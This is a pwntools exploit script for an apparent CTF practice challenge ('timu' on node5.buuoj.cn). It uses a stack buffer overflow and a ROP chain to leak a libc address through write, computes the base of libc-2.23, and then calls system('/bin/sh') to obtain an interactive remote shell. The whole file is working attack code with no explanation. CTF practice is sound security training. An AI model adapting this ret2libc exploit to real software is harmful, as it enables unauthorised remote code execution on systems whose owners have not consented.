from pwn import *

#sh=process("./timu")
sh=remote("node5.buuoj.cn",25388)
elf=ELF("./timu")
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc=ELF("./libc-2.23.so")

write_plt=elf.plt["write"]
write_got=elf.got["write"]
main=0x000000000040061A
pop_rdi_ret=0x00000000004006b3
pop_rsi_r15_ret=0x00000000004006b1

payload=0x88*b'a'+p64(pop_rdi_ret)+p64(1)+p64(pop_rsi_r15_ret)+p64(write_got)+8*b'a'+p64(write_plt)+p64(main)
sh.recvuntil(b"Input:\n")
sh.sendline(payload)
write_addr=u64(sh.recv(6).ljust(8,b"\x00"))

libc_base=write_addr-libc.sym["write"]
print("libc_base=",hex(libc_base))
system_addr=libc_base+libc.sym["system"]
binsh=libc_base+next(libc.search(b"/bin/sh"))

payload=0x88*b'a'+p64(pop_rdi_ret)+p64(binsh)+p64(system_addr)+p64(main)
sh.recvuntil(b"Input:\n")
sh.sendline(payload)

sh.interactive()
